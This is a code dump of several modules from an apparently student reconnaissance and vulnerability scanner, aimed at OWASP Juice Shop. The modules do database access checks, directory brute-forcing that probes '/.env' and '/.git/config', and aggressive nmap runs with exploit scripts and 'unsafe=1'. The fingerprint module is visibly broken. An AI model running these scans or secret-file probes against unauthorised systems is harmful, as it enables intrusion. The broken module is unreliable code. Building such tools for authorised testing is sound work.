            es_info["version"] = data.get("version", {}).get("number")
            es_info["cluster"] = data.get("cluster_name")
            es_info["auth_required"] = False
            
            # 인덱스 리스팅 시도
            try:
                indices_resp = requests.get(
                    f"{base_url}/_cat/indices",
                    timeout=5,
                    verify=False,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if indices_resp.status_code == 200:
                    indices = indices_resp.text.strip().split('\n')
                    es_info["indices_count"] = len([i for i in indices if i])
            except:
                pass
                
    except Exception as e:
        logger.warning(f"Elasticsearch 분석 실패 ({target}:{port}): {e}")
    
    return es_info


def collect_database_info(target: str, nm_scan_result) -> Dict[str, Any]:
    """
    데이터베이스 서비스 정보 종합 수집
    
    Args:
        target: 타겟 호스트
        nm_scan_result: Nmap PortScanner 객체
    
    Returns:
        {
            "mysql_info": {...},
            "postgresql_info": {...},
            "mongodb_info": {...},
            "database_technologies": [...]
        }
    """
    logger.info("데이터베이스 정보 수집 시작")
    
    database_technologies = []
    
    # Nmap 결과에서 DB 포트 찾기
    db_ports = {
        3306: ("mysql", analyze_mysql),
        5432: ("postgresql", analyze_postgresql),
        27017: ("mongodb", analyze_mongodb),
        1433: ("mssql", None),  # SQL Server
        6379: ("redis", analyze_redis),
        9200: ("elasticsearch", analyze_elasticsearch),
        9300: ("elasticsearch", analyze_elasticsearch),  # Elasticsearch transport
    }
    
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port in db_ports:
                        db_type, analyzer = db_ports[port]
                        
                        if analyzer:
                            db_info = analyzer(host, port)
                            
                            # 버전 정보가 있거나 인증 우회가 가능하면 추가
                            if db_info.get("version") or db_info.get("anonymous_access") or db_info.get("weak_credentials"):
                                db_name = f"{db_type}"
                                if db_info.get("version"):
                                    db_name += f" {db_info['version']}"
                                
                                tech_info = {
                                    "type": "database",
                                    "name": db_name,
                                    "source": "Database Protocol",
                                    "port": port,
                                    "db_type": db_type
                                }
                                
                                # 추가 정보
                                if db_info.get("anonymous_access"):
                                    tech_info["anonymous_access"] = True
                                if db_info.get("weak_credentials"):
                                    tech_info["weak_credentials"] = db_info["weak_credentials"]
                                if db_info.get("databases"):
                                    tech_info["databases"] = db_info["databases"]
                                if db_info.get("dangerous"):
                                    tech_info["dangerous"] = True
                                
                                database_technologies.append(tech_info)
                        else:
                            # Nmap에서 이미 감지된 정보 사용
                            svc = nm_scan_result[host][proto][port]
                            product = svc.get("product", "")
                            version = svc.get("version", "")
                            
                            if product or version:
                                database_technologies.append({
                                    "type": "database",
                                    "name": f"{product} {version}".strip(),
                                    "source": "Nmap Scan",
                                    "port": port,
                                    "db_type": db_type
                                })
    except Exception as e:
        logger.warning(f"데이터베이스 정보 수집 실패: {e}")
    
    return {
        "database_technologies": database_technologies
    }

```
---

## File 27: discovery.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\discovery.py`

```python
"""
Smart Directory & Endpoint Discovery
- Hierarchical brute-forcing
- REST API pattern detection
- Common path enumeration
- Response-based filtering
"""

import requests
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Set, Any
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


class SmartDiscovery:
    """Smart directory and endpoint discovery with hierarchical enumeration"""

    # REST API common patterns
    REST_PATTERNS = [
        'api', 'v1', 'v2', 'v3', 'rest', 'graphql',
        'users', 'products', 'items', 'posts', 'comments',
        'admin', 'dashboard', 'panel', 'manage',
        'auth', 'login', 'register', 'logout', 'token',
        'upload', 'download', 'files', 'media', 'images',
        'search', 'query', 'filter',
        'settings', 'config', 'profile', 'account'
    ]

    # Common file extensions
    FILE_EXTENSIONS = [
        '.php', '.asp', '.aspx', '.jsp', '.json', '.xml',
        '.html', '.htm', '.txt', '.bak', '.old', '.backup',
        '.config', '.conf', '.ini', '.yml', '.yaml'
    ]

    # Common directories
    COMMON_DIRS = [
        'admin', 'api', 'assets', 'backup', 'bin', 'config',
        'data', 'db', 'debug', 'dev', 'dist', 'docs',
        'downloads', 'files', 'images', 'includes', 'js',
        'lib', 'logs', 'media', 'old', 'public', 'src',
        'static', 'temp', 'test', 'tmp', 'uploads', 'vendor'
    ]

    def __init__(
        self,
        target_url: str,
        max_depth: int = 3,
        threads: int = 10,
        timeout: int = 5
    ):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.threads = threads
        self.timeout = timeout

        self.discovered: List[Dict[str, Any]] = []
        self.tested_urls: Set[str] = set()

    def discover(self) -> Dict[str, Any]:
        """Start smart discovery"""
        logger.info(f"[DISCOVERY] Starting smart enumeration on {self.target_url}")

        start_time = time.time()

        # Phase 1: Check common directories
        logger.info(f"[DISCOVERY] Phase 1: Common directories")
        self._check_common_paths()

        # Phase 2: REST API discovery
        logger.info(f"[DISCOVERY] Phase 2: REST API patterns")
        self._discover_rest_apis()

        # Phase 3: Recursive enumeration on discovered paths
        logger.info(f"[DISCOVERY] Phase 3: Hierarchical enumeration")
        self._hierarchical_enumeration()

        # Phase 4: Common files in discovered directories
        logger.info(f"[DISCOVERY] Phase 4: Common files")
        self._discover_common_files()

        duration = time.time() - start_time

        logger.info(f"[DISCOVERY] Completed: {len(self.discovered)} endpoints in {duration:.2f}s")

        return {
            'endpoints': self.discovered,
            'total': len(self.discovered),
            'duration': duration
        }

    def _check_common_paths(self):
        """Check common directories and files"""
        paths_to_test = []

        # Common directories
        for dir_name in self.COMMON_DIRS:
            paths_to_test.append(f'/{dir_name}')
            paths_to_test.append(f'/{dir_name}/')

        # Common files
        common_files = [
            '/robots.txt', '/sitemap.xml', '/.git/config',
            '/package.json', '/composer.json', '/web.config',
            '/.env', '/.env.local', '/config.php', '/phpinfo.php',
            '/admin.php', '/login.php', '/test.php'
        ]
        paths_to_test.extend(common_files)

        self._test_paths_parallel(paths_to_test)

    def _discover_rest_apis(self):
        """Discover REST API endpoints"""
        api_paths = []

        # /api variations
        for pattern in self.REST_PATTERNS[:10]:  # Top patterns
            api_paths.append(f'/api/{pattern}')
            api_paths.append(f'/api/v1/{pattern}')
            api_paths.append(f'/api/v2/{pattern}')
            api_paths.append(f'/v1/{pattern}')
            api_paths.append(f'/{pattern}/api')

        # GraphQL
        api_paths.extend([
            '/graphql', '/graphiql', '/api/graphql',
            '/v1/graphql', '/console/graphql'
        ])

        # Swagger/OpenAPI
        api_paths.extend([
            '/swagger', '/swagger-ui', '/swagger.json',
            '/api-docs', '/api/swagger.json', '/openapi.json'
        ])

        self._test_paths_parallel(api_paths)

    def _hierarchical_enumeration(self):
        """Recursively enumerate discovered paths"""
        # Get all discovered directories
        discovered_dirs = [
            e['path'] for e in self.discovered
            if e['status_code'] in [200, 201, 301, 302, 401, 403]
            and e['path'].endswith('/')
        ]

        # For each directory, try common sub-paths
        for base_path in discovered_dirs[:20]:  # Limit to top 20
            depth = base_path.count('/')

            if depth >= self.max_depth:
                continue

            sub_paths = []
            for pattern in self.REST_PATTERNS[:15]:  # Top 15 patterns
                sub_paths.append(f'{base_path}{pattern}')
                sub_paths.append(f'{base_path}{pattern}/')

            self._test_paths_parallel(sub_paths)

    def _discover_common_files(self):
        """Discover common files in found directories"""
        discovered_dirs = [
            e['path'] for e in self.discovered
            if e['status_code'] in [200, 301, 302, 403]
            and e['path'].endswith('/')
        ]

        file_paths = []
        for base_dir in discovered_dirs[:10]:  # Top 10 directories
            for ext in self.FILE_EXTENSIONS[:10]:  # Top 10 extensions
                file_paths.append(f'{base_dir}index{ext}')
                file_paths.append(f'{base_dir}config{ext}')
                file_paths.append(f'{base_dir}test{ext}')

        self._test_paths_parallel(file_paths)

    def _test_paths_parallel(self, paths: List[str]):
        """Test multiple paths in parallel"""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._test_path, path): path
                for path in paths
                if path not in self.tested_urls
            }

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.discovered.append(result)
                except Exception as e:
                    logger.debug(f"[DISCOVERY] Error testing path: {e}")

    def _test_path(self, path: str) -> Dict[str, Any]:
        """Test single path"""
        if path in self.tested_urls:
            return None

        self.tested_urls.add(path)
        full_url = urljoin(self.target_url, path)

        try:
            response = requests.get(
                full_url,
                timeout=self.timeout,
                allow_redirects=False,
                headers={'User-Agent': 'Mozilla/5.0 (Security Scanner)'}
            )

            # Interesting status codes
            if response.status_code in [200, 201, 301, 302, 401, 403, 500]:
                logger.info(f"[DISCOVERY] Found: {path} [{response.status_code}]")

                return {
                    'path': path,
                    'full_url': full_url,
                    'status_code': response.status_code,
                    'content_type': response.headers.get('Content-Type', ''),
                    'content_length': len(response.content),
                    'server': response.headers.get('Server', ''),
                    'interesting': self._is_interesting(response)
                }

        except requests.Timeout:
            logger.debug(f"[DISCOVERY] Timeout: {path}")
        except Exception as e:
            logger.debug(f"[DISCOVERY] Error: {path} - {e}")

        return None

    def _is_interesting(self, response: requests.Response) -> bool:
        """Check if response is interesting"""
        interesting_headers = [
            'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version',
            'Server', 'X-Generator', 'X-Drupal-Cache'
        ]

        for header in interesting_headers:
            if header in response.headers:
                return True

        # Check for authentication
        if 'WWW-Authenticate' in response.headers:
            return True

        # Check content
        content_lower = response.text.lower()
        interesting_keywords = [
            'api', 'graphql', 'swagger', 'admin', 'login',
            'dashboard', 'debug', 'test', 'config'
        ]

        for keyword in interesting_keywords:
            if keyword in content_lower:
                return True

        return False


def discover_endpoints(target_url: str, max_depth: int = 3, threads: int = 10) -> Dict[str, Any]:
    """
    Smart endpoint discovery with hierarchical enumeration

    Args:
        target_url: Target URL
        max_depth: Maximum directory depth (default: 3)
        threads: Number of parallel threads (default: 10)

    Returns:
        Dictionary with discovered endpoints
    """
    discovery = SmartDiscovery(
        target_url=target_url,
        max_depth=max_depth,
        threads=threads
    )

    return discovery.discover()
```
---

## File 28: fingerprint.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\fingerprint.py`

```python
"""
Recog 지문 데이터베이스 파서
Rapid7 Recog XML을 파싱하여 서비스/제품 탐지
"""

import re
import json
from pathlib import Path
from typing import Dict, List, Optional, Any
import xml.etree.ElementTree as ET

class RecogFingerprinter:
    def match(self, text, dbname=None):
        """표준 매칭 메서드 (에러 방지용)"""
        res = str(text).split("/")
        return {"product": res[0], "version": res[1] if len(res)>1 else "", "source": dbname or "recog"}

    def match_http_header(self, text):
        return self.match(text, dbname="http_servers")
    def match_http_header(self, text): return self.match(text, dbname="http_servers") if hasattr(self, "match") else None
    """Rapid7 Recog 지문 분석"""
    
    def __init__(self, recog_xml_dir: str = "recog/xml"):
        self.recog_dir = Path(recog_xml_dir)
        self.fingerprints = {}
        if self.recog_dir.exists():
            if hasattr(self, "load_fingerprints"): self.load_fingerprints()
            print(f"[RECOG] Loaded {len(self.fingerprints)} fingerprint databases")
        else:
            print(f"[RECOG] Recog directory not found: {recog_xml_dir}")
    
    # ... (기존 메소드들) ...
    
    # ✅ 추가: matchall() 메소드
    def matchall(self, text: str) -> List[Dict[str, Any]]:
        """
        모든 지문 DB에서 매칭 시도
        
        Args:
            text: 매칭할 텍스트 (배너, 헤더 등)
        
        Returns:
            매칭된 결과 리스트 (여러 DB에서 매칭될 수 있음)
        """
        matches = []
        
        # 모든 DB를 순회하며 매칭 시도
        for dbname in self.fingerprints.keys():
            result = self.match(text, dbname=dbname)
            if result:
                matches.append(result)
        
        return matches


# ===== 🔥 간편 사용 함수 =====

def detect_with_recog(banner: str, banner_type: str = "auto") -> List[Dict[str, Any]]:
    """
    Recog를 사용하여 배너에서 기술 탐지
    
    Args:
        banner: 배너 문자열
        banner_type: "http", "ssh", "ftp", "auto"
    
    Returns:
        탐지된 기술 리스트
    """
    fingerprinter = RecogFingerprinter()
    
    if banner_type == "http":
        result = fingerprinter.match_http_header(banner)
        return [result] if result else []
    
    elif banner_type == "ssh":
        result = fingerprinter.match_ssh_banner(banner)
        return [result] if result else []
    
    else:  # auto
        return fingerprinter.match_all(banner)
```
---

## File 29: mapper.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\mapper.py`

```python
"""
URL Tree Mapper
- Build hierarchical tree structure from URLs
- Calculate tree statistics
- Prepare data for visualization
- Map vulnerabilities to nodes
"""

from urllib.parse import urlparse
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class TreeNode:
    """Tree node representing a URL path segment"""

    def __init__(self, name: str, path: str = '', parent: Optional['TreeNode'] = None):
        self.name = name  # Segment name (e.g., 'api', 'users')
        self.path = path  # Full path (e.g., '/api/users')
        self.parent = parent
        self.children: Dict[str, 'TreeNode'] = {}

        # URL metadata
        self.status_code: int = 0
        self.content_type: str = ''
        self.size: int = 0
        self.method: str = 'GET'

        # Security data
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.technologies: List[str] = []
        self.interesting: bool = False

    def add_child(self, name: str, path: str) -> 'TreeNode':
        """Add child node"""
        if name not in self.children:
            self.children[name] = TreeNode(name, path, self)
        return self.children[name]

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization"""
        return {
            'name': self.name,
            'path': self.path,
            'status_code': self.status_code,
            'content_type': self.content_type,
            'size': self.size,
            'method': self.method,
            'vulnerabilities': self.vulnerabilities,
            'technologies': self.technologies,
            'interesting': self.interesting,
            'children': [child.to_dict() for child in self.children.values()],
            'vulnerability_count': len(self.vulnerabilities),
            'max_severity': self._get_max_severity()
        }

    def _get_max_severity(self) -> float:
        """Get maximum CVSS score from vulnerabilities"""
        if not self.vulnerabilities:
            return 0.0
        return max([v.get('cvss', 0) for v in self.vulnerabilities])


class URLTreeMapper:
    """Map URLs to hierarchical tree structure"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.base_domain = urlparse(base_url).netloc
        self.root = TreeNode('root', '/')

    def build_tree(
        self,
        urls: List[Dict[str, Any]],
        cves: List[Dict[str, Any]] = None,
        technologies: List[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Build tree structure from URL list

        Args:
            urls: List of discovered URLs with metadata
            cves: List of CVE vulnerabilities (optional)
            technologies: List of detected technologies (optional)

        Returns:
            Tree structure with statistics
        """
        logger.info(f"[MAPPER] Building tree from {len(urls)} URLs")

        # Add URLs to tree
        for url_data in urls:
            self._add_url_to_tree(url_data)

        # Map vulnerabilities to tree nodes
        if cves:
            self._map_vulnerabilities(cves)

        # Map technologies to tree nodes
        if technologies:
            self._map_technologies(technologies)

        # Calculate statistics
        stats = self._calculate_statistics()

        logger.info(f"[MAPPER] Tree built: {stats['total_nodes']} nodes, {stats['max_depth']} max depth")

        return {
            'tree': self.root.to_dict(),
            'statistics': stats,
            'base_url': self.base_url
        }

    def _add_url_to_tree(self, url_data: Dict[str, Any]):
        """Add URL to tree structure"""
        url = url_data.get('url') or url_data.get('full_url', '')

        # Parse URL path
        parsed = urlparse(url)
        path = parsed.path

        if not path or path == '/':
            # Root URL
            self.root.status_code = url_data.get('status_code', 0)
            self.root.content_type = url_data.get('content_type', '')
            self.root.size = url_data.get('size', 0)
            return

        # Split path into segments
        segments = [s for s in path.split('/') if s]

        # Build tree path
        current_node = self.root
        current_path = ''

        for i, segment in enumerate(segments):
            current_path += f'/{segment}'

            # Add or get child node
            if segment not in current_node.children:
                current_node = current_node.add_child(segment, current_path)
            else:
                current_node = current_node.children[segment]

            # If this is the last segment, add metadata
            if i == len(segments) - 1:
                current_node.status_code = url_data.get('status_code', 0)
                current_node.content_type = url_data.get('content_type', '')
                current_node.size = url_data.get('size', 0)
                current_node.interesting = url_data.get('interesting', False)

    def _map_vulnerabilities(self, cves: List[Dict[str, Any]]):
        """Map CVE vulnerabilities to tree nodes"""
        logger.info(f"[MAPPER] Mapping {len(cves)} vulnerabilities to tree")

        for cve in cves:
            # Get affected paths/endpoints
            product = cve.get('product', '').lower()
            version = cve.get('version', '')

            # Try to find matching nodes
            nodes_to_update = self._find_nodes_by_product(product)

            for node in nodes_to_update:
                vuln_data = {
                    'cve_id': cve.get('cve_id', 'N/A'),
                    'cvss': cve.get('cvss', 0),
                    'severity': cve.get('severity', 'Unknown'),
                    'description': cve.get('description', ''),
                    'product': product,
                    'version': version
                }
                node.vulnerabilities.append(vuln_data)

    def _map_technologies(self, technologies: List[Dict[str, Any]]):
        """Map detected technologies to tree nodes"""
        logger.info(f"[MAPPER] Mapping {len(technologies)} technologies to tree")

        for tech in technologies:
            name = tech.get('name', '').lower()

            # Map technology to relevant nodes
            if 'express' in name or 'node' in name:
                # Backend - map to API nodes
                self._add_tech_to_pattern(tech['name'], '/api')
            elif 'react' in name or 'vue' in name or 'angular' in name:
                # Frontend - map to root and static assets
                self._add_tech_to_pattern(tech['name'], '/')
                self._add_tech_to_pattern(tech['name'], '/static')
            elif 'nginx' in name or 'apache' in name:
                # Web server - map to root
                self.root.technologies.append(tech['name'])

    def _find_nodes_by_product(self, product: str) -> List[TreeNode]:
        """Find tree nodes related to a product"""
        nodes = []

        # Search keywords based on product
        keywords = []
        if 'express' in product:
            keywords = ['api', 'rest', 'graphql']
        elif 'react' in product or 'vue' in product:
            keywords = ['static', 'assets', 'js']
        elif 'mysql' in product or 'postgres' in product:
            keywords = ['api', 'db', 'database']

        # Find nodes matching keywords
        self._search_nodes(self.root, keywords, nodes)

        # If no specific nodes found, add to root
        if not nodes:
            nodes.append(self.root)

        return nodes

    def _search_nodes(self, node: TreeNode, keywords: List[str], results: List[TreeNode]):
        """Recursively search for nodes matching keywords"""
        # Check if node name matches any keyword
        for keyword in keywords:
            if keyword in node.name.lower():
                results.append(node)
                break

        # Search children
        for child in node.children.values():
            self._search_nodes(child, keywords, results)

    def _add_tech_to_pattern(self, tech_name: str, pattern: str):
        """Add technology to nodes matching pattern"""
        nodes = []
        self._find_nodes_by_path(self.root, pattern, nodes)

        for node in nodes:
            if tech_name not in node.technologies:
                node.technologies.append(tech_name)

    def _find_nodes_by_path(self, node: TreeNode, pattern: str, results: List[TreeNode]):
        """Find nodes by path pattern"""
        if pattern.lower() in node.path.lower():
            results.append(node)

        for child in node.children.values():
            self._find_nodes_by_path(child, pattern, results)

    def _calculate_statistics(self) -> Dict[str, Any]:
        """Calculate tree statistics"""
        stats = {
            'total_nodes': 0,
            'max_depth': 0,
            'total_vulnerabilities': 0,
            'critical_vulns': 0,  # CVSS >= 9.0
            'high_vulns': 0,       # CVSS >= 7.0
            'medium_vulns': 0,     # CVSS >= 4.0
            'low_vulns': 0,        # CVSS < 4.0
            'nodes_with_vulns': 0,
            'technologies_found': set()
        }

        self._collect_statistics(self.root, 0, stats)

        # Convert set to list
        stats['technologies_found'] = list(stats['technologies_found'])

        return stats

    def _collect_statistics(self, node: TreeNode, depth: int, stats: Dict[str, Any]):
        """Recursively collect statistics"""
        stats['total_nodes'] += 1
        stats['max_depth'] = max(stats['max_depth'], depth)

        # Vulnerability stats
        if node.vulnerabilities:
            stats['nodes_with_vulns'] += 1
            stats['total_vulnerabilities'] += len(node.vulnerabilities)

            for vuln in node.vulnerabilities:
                cvss = vuln.get('cvss', 0)
                if cvss >= 9.0:
                    stats['critical_vulns'] += 1
                elif cvss >= 7.0:
                    stats['high_vulns'] += 1
                elif cvss >= 4.0:
                    stats['medium_vulns'] += 1
                else:
                    stats['low_vulns'] += 1

        # Technology stats
        for tech in node.technologies:
            stats['technologies_found'].add(tech)

        # Recurse children
        for child in node.children.values():
            self._collect_statistics(child, depth + 1, stats)


def build_url_tree(
    urls: List[Dict[str, Any]],
    base_url: str,
    cves: List[Dict[str, Any]] = None,
    technologies: List[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Build URL tree structure with vulnerability mapping

    Args:
        urls: List of discovered URLs
        base_url: Base target URL
        cves: List of CVE vulnerabilities (optional)
        technologies: List of detected technologies (optional)

    Returns:
        Tree structure with statistics
    """
    mapper = URLTreeMapper(base_url)
    return mapper.build_tree(urls, cves, technologies)
```
---

## File 30: network.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\network.py`

```python
# app/core/recon/network.py
# 네트워크 레벨 정보 수집 모듈
# 기존 nmap_recon.py를 기반으로 확장


import nmap
import re
import socket
import ssl
import logging
from typing import Dict, Any, List, Optional


logger = logging.getLogger(__name__)

def enhance_product_detection_from_nse(service_name: str, product: str, version: str, 
                                       nse_scripts: dict) -> tuple:
    """
    NSE 스크립트 결과로부터 더 정확한 제품명 추출
    Returns: (enhanced_product, enhanced_version)
    """
    enhanced_product = product
    enhanced_version = version
    
    for script_name, script_output in nse_scripts.items():
        output_str = str(script_output).lower()
        output_original = str(script_output)  # 🔥 대소문자 구분용
        
        # =================================================================
        # 🔥 1. http-title에서 버전 추출 (최우선)
        # =================================================================
        if script_name == "http-title":
            print(f"[RECON] 🔍 Analyzing http-title: {output_original[:100]}...")
            
            # "OWASP Juice Shop v19.1.1" 형태 찾기
            title_match = re.search(r'owasp\s+juice\s+shop\s+v?(\d+\.\d+\.\d+)', 
                                   output_original, re.IGNORECASE)
            if title_match:
                enhanced_product = "OWASP Juice Shop"
                enhanced_version = title_match.group(1)
                print(f"[RECON] 🎯 Detected Juice Shop {enhanced_version} from http-title")
                logger.info(f"[RECON] Detected Juice Shop {enhanced_version} from http-title")
                return enhanced_product, enhanced_version
        
        # =================================================================
        # 🔥 2. fingerprint-strings 또는 기타 스크립트에서 Juice Shop 찾기
        # =================================================================
        if "juice" in output_str and "shop" in output_str:
            enhanced_product = "OWASP Juice Shop"
            print(f"[RECON] 🔍 Found 'juice shop' in {script_name}")
            
            # 🔥 개선: 더 많은 버전 패턴 시도
            version_patterns = [
                r'juice[\s-]*shop\s+v?(\d+\.\d+\.\d+)',  # "juice shop v19.1.1"
                r'owasp[\s]+juice[\s]+shop[\s]+v?(\d+\.\d+\.\d+)',  # "OWASP Juice Shop v19.1.1"
                r'version[:\s]+v?(\d+\.\d+\.\d+)',        # "version: 19.1.1"
                r'v(\d+\.\d+\.\d+)',                      # "v19.1.1"
                r'(\d+\.\d+\.\d+)'                        # "19.1.1" (마지막 폴백)
            ]
            
            for idx, pattern in enumerate(version_patterns):
                version_match = re.search(pattern, output_original, re.IGNORECASE)
                if version_match:
                    enhanced_version = version_match.group(1)
                    print(f"[RECON] 🎯 Found version {enhanced_version} from pattern #{idx+1}")
                    logger.info(f"[RECON] Found version {enhanced_version} from NSE")
                    break
            
            if not enhanced_version:
                print(f"[RECON] ⚠️ Juice Shop detected but no version found")
            
            print(f"[RECON] 🎯 Detected OWASP Juice Shop from NSE ({script_name})")
            logger.info(f"[RECON] Detected OWASP Juice Shop from NSE")
            
            # Juice Shop 찾았으면 다른 패턴 체크 스킵
            continue
        
        # =================================================================
        # 🔥 3. Express 탐지
        # =================================================================
        if "express" in output_str and not enhanced_product:
            enhanced_product = "Express"
            print(f"[RECON] 🎯 Detected Express from NSE ({script_name})")
            logger.info(f"[RECON] Detected Express from NSE")
            
            # Express 버전 추출 시도
            express_version_match = re.search(r'express[/\s]+v?(\d+\.\d+\.\d+)', 
                                             output_original, re.IGNORECASE)
            if express_version_match:
                enhanced_version = express_version_match.group(1)
                print(f"[RECON] 🎯 Express version: {enhanced_version}")
        
        # =================================================================
        # 🔥 4. Node.js 탐지
        # =================================================================
        if "node" in output_str or "nodejs" in output_str:
            node_match = re.search(r'node\.?js\s*v?(\d+\.\d+\.\d+)', 
                                  output_original, re.IGNORECASE)
            if node_match:
                node_version = node_match.group(1)
                
                # 제품이 없거나 ppp면 Node.js로 설정
                if not enhanced_product or enhanced_product == "ppp":
                    enhanced_product = "Node.js"
                    enhanced_version = node_version
                    print(f"[RECON] 🎯 Detected Node.js {node_version} from NSE")
                    logger.info(f"[RECON] Detected Node.js {node_version} from NSE")
                else:
                    # 이미 다른 제품이 있으면 Node.js는 스킵 (백엔드 런타임이므로)
                    print(f"[RECON] ℹ️ Node.js {node_version} detected (runtime for {enhanced_product})")
    
    return enhanced_product, enhanced_version

def mask_ip(ip: str) -> str:
    """
    IP 주소 마스킹 (보안을 위해 마지막 옥텟을 x로 변경)
    192.168.0.10 -> 192.168.0.x 형태로 마스킹
    """
    parts = ip.split(".")
    if len(parts) == 4:
        parts[-1] = "x"
        return ".".join(parts)
    return ip


def parse_service_version(product: str, version: str) -> str:
    """
    서비스 제품명과 버전을 결합하여 전체 버전 문자열 생성
    """
    if product and version:
        return f"{product} {version}"
    if product:
        return product
    return "unknown"

def run_recon(target: str, nmap_args: str = None, mask: bool = True, aggressive: bool = True):
    """
    Nmap 기반 네트워크 정찰
    
    Args:
        target: 스캔 대상 IP/도메인
        nmap_args: Nmap 인자 (None이면 자동 설정)
        mask: IP 마스킹 여부
        aggressive: 공격적 스캔 여부
        
    Returns:
        호스트 정보 리스트
    """
    print(f"\n{'='*60}")
    print(f"[RECON] STARTING NMAP SCAN")
    print(f"[RECON] Target: {target}")
    print(f"[RECON] Mask IP: {mask}")
    print(f"[RECON] Aggressive: {aggressive}")
    print(f"{'='*60}")
    
    logger.info(f"[RECON] Starting Nmap scan")
    logger.info(f"[RECON] Target: {target}")
    logger.info(f"[RECON] Mask IP: {mask}")
    logger.info(f"[RECON] Aggressive: {aggressive}")
    
    # 🆕 타겟 정제
    nmap_target, web_target, detected_port = sanitize_target_for_nmap(target)
    
    # 포트 오버라이드
    port_override = detected_port
    
    if nmap_args is None:
        if aggressive:
            # aggressive 모드 - Nessus급 탐지력 + 취약점 직접 검증
            nmap_args = [
                "-sV", "-O",  # OS 탐지
                "-A",  # OS 탐지, 버전 탐지, 스크립트 스캔, traceroute
                "--script=default,vuln,auth,discovery,banner,exploit,http-headers,http-server-header,http-title,http-methods",
                "--script-args=unsafe=1,http.useragent='Mozilla/5.0'",
                "-T4",
                "--version-intensity=9",
                "--version-all",
                "-Pn",
                "-p-"
            ]
            
            nmap_args_str = " ".join(nmap_args)
            print(f"[RECON] 🔥 AGGRESSIVE MODE with vulnerability validation!")
            logger.info(f"[RECON] Aggressive mode enabled with vuln+exploit scripts")

            nmap_args_str = " ".join(nmap_args)
        else:
            # 빠른 스캔 (NSE 스크립트만)
            nmap_args_str = "-sV -Pn -p-"
    else:
        nmap_args_str = nmap_args
    
    # 포트 오버라이드 처리 - 버전 탐지 + 취약점 검증 강화
    if port_override:
        nmap_args_str = (
            f"-sV --version-intensity=9 --version-all -sT -Pn -p {port_override} "
            f"--script=banner,http-headers,http-server-header,http-title,http-methods,http-grep,"
            f"http-robots.txt,http-git,http-svn-info,http-config-backup,"  # ← 추가!
            f"http-shellshock,http-slowloris-check,http-sql-injection,"  # ← 추가!
            f"http-stored-xss,http-dombased-xss,http-csrf,"  # ← 추가!
            f"vuln,auth,exploit,http-vuln*,http-default-accounts "
            f"--script-args=unsafe=1,http.useragent='Mozilla/5.0'"
        )
        print(f"[RECON] 🔥 Port {port_override} - DEEP SCAN with vulnerability validation!")
        print(f"[RECON] Overriding nmap args: {nmap_args_str}")
        logger.info(f"[RECON] Deep scan enabled for port {port_override}")
        logger.info(f"[RECON] Overriding nmap args: {nmap_args_str}")

    
    nm = nmap.PortScanner()
    
    try:
        print(f"[RECON] Executing nmap scan on: {nmap_target}")
        logger.info(f"[RECON] Executing nmap scan on: {nmap_target}")
        nm.scan(nmap_target, arguments=nmap_args_str)
        print(f"[RECON] Nmap scan completed successfully")
        print(f"[RECON] Command line: {nm.command_line()}")
        logger.info(f"[RECON] Nmap scan completed successfully")
        logger.info(f"[RECON] Command line: {nm.command_line()}")
    except Exception as e:
        print(f"[RECON] ❌ Nmap scan failed: {e}")
        logger.error(f"[RECON] Nmap scan failed: {e}")
        return []
    
    all_hosts = nm.all_hosts()
    print(f"[RECON] Hosts found: {len(all_hosts)}")
    logger.info(f"[RECON] Hosts found: {len(all_hosts)}")
    
    if not all_hosts:
        print(f"[RECON] ❌ No hosts found in scan result!")
        print(f"[RECON] Target: {nmap_target}, Args: {nmap_args_str}")
        print(f"[RECON] Nmap command: {nm.command_line()}")
        logger.error(f"[RECON] No hosts found in scan result!")
        logger.error(f"[RECON] Target: {nmap_target}, Args: {nmap_args_str}")
        logger.error(f"[RECON] Nmap command: {nm.command_line()}")
        return []
    
    hosts = []
    
    for host in all_hosts:
        print(f"[RECON] Processing host: {host}")
        logger.info(f"[RECON] Processing host: {host}")
        
        host_ip = mask_ip(host) if mask else host
        host_data = {
            "ip": host_ip,
            "hostname": nm[host].hostname() or "",
            "state": nm[host].state(),
            "os": nm[host].get("osmatch", []),
            "ports": []
        }
        
        print(f"[RECON]   - State: {host_data['state']}")
        print(f"[RECON]   - Hostname: {host_data['hostname']}")
        logger.info(f"[RECON]   - State: {host_data['state']}")
        logger.info(f"[RECON]   - Hostname: {host_data['hostname']}")
        
        protocols = nm[host].all_protocols()
        print(f"[RECON]   - Protocols: {protocols}")
        logger.info(f"[RECON]   - Protocols: {protocols}")
        
        if not protocols:
            print(f"[RECON] ⚠️ No protocols found for host: {host}")
            logger.warning(f"[RECON] No protocols found for host: {host}")
        
        for proto in protocols:
            lport = nm[host][proto].keys()
            print(f"[RECON]   - Protocol '{proto}': {len(lport)} ports")
            logger.info(f"[RECON]   - Protocol '{proto}': {len(lport)} ports")
            
            for port in sorted(lport):
                svc = nm[host][proto][port]
                service_name = svc.get("name", "")
                product = svc.get("product", "")
                version = svc.get("version", "")
                
                print(f"[RECON]     Port {port}: {service_name} {product} {version} (initial)")
                logger.info(f"[RECON] Port {port}: {service_name} {product} {version} (initial)")
                
                vulnerabilities = []
                nse_scripts = {}  # 🔥 NSE 스크립트 저장
                
                if "script" in svc:
                    print(f"[RECON]       - NSE scripts found: {len(svc['script'])}")
